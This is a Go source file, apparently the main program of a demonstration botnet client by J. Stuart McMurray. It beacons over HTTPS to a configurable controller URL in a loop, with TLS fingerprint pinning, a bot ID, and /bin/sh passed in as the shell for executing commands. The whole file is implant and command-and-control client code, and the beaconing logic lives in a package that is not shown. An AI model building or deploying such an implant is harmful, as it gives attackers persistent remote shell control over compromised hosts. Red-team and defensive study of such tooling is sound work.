// Program anime_costume_cheese - HTTPS beacons in a loop without curl
package main

/*
 * anime_costume_cheese.go
 * HTTPS beacons in a loop without curl
 * By J. Stuart McMurray
 * Created 20251116
 * Last Modified 20251116
 */

import (
	"context"
	"flag"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"

	"github.com/magisterquis/anime_costume_cheese/pkg/beaconer"
)

var (
	Fingerprint string  /* TLS Fingerprint. */
	ID          string  /* Bot ID, optional. */
	URL         string  /* Demobotnet controller URL, less ID. */
	Interval    = "15s" /* Beacon interval. */
)

func main() {
	/* Command-line flags. */
	var (
		maxRuntime = flag.Duration(
			"max-runtime",
			0,
			"Maximum run `duration`",
		)
		debug = flag.Bool(
			"debug",
			false,
			"Enable debug logging",
		)
	)
	flag.StringVar(
		&Fingerprint,
		"fingerprint",
		Fingerprint,
		"TLS `fingerprint`",
	)
	flag.StringVar(
		&ID,
		"id",
		ID,
		"Bot ID (unset to autogenerate)",
	)
	flag.StringVar(
		&URL,
		"url",
		URL,
		"Demobotnetcontroller `URL`, less ID",
	)
	flag.StringVar(
		&Interval,
		"interval",
		Interval,
		"Beacon `interval`",
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options]

HTTPS beacons in a loop without curl

Client for https://github.com/magisterquis/demobotnetcontroller

Options:
`,
			filepath.Base(os.Args[0]),
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Don't run too long (maybe) */
	ctx := context.Background()
	if 0 != *maxRuntime {
		var cancel func()
		ctx, cancel = context.WithTimeout(ctx, *maxRuntime)
		defer cancel()
	}

	/* Work out logging. */
	lv := slog.LevelInfo
	if *debug {
		lv = slog.LevelDebug
	}
	sl := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
		Level: lv,
	}))

	if err := (&beaconer.Beaconer{
		SL:          sl,
		Fingerprint: Fingerprint,
		ID:          ID,
		URL:         URL,
		Interval:    Interval,
		ShellArgv:   []string{"/bin/sh"},
	}).Beacon(ctx); nil != err {
		sl.Error("Fatal error", "error", err)
	}
}
